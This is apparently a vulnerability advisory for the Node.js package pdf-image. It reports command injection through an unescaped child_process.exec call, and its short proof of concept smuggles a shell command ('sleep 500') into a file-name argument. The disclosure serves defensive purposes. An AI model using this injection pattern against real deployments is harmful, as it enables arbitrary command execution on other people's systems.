[pdf-image](https://github.com/mooz/node-pdf-image)  is a library that provides an interface to convert PDF's pages to png files in Node.js by using ImageMagick.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to the  `child_process.exec`  call lacking escaping on user input.
## Proof of Concept
```
var PDFImage = require("pdf-image").PDFImage;

var pdfImage = new PDFImage('"; sleep 500 #"');
pdfImage.getInfo();
```
## References
-   [HackerOne Report](https://hackerone.com/reports/781664)
-   [Vulnerable Code](https://github.com/mooz/node-pdf-image/blob/master/index.js#L27)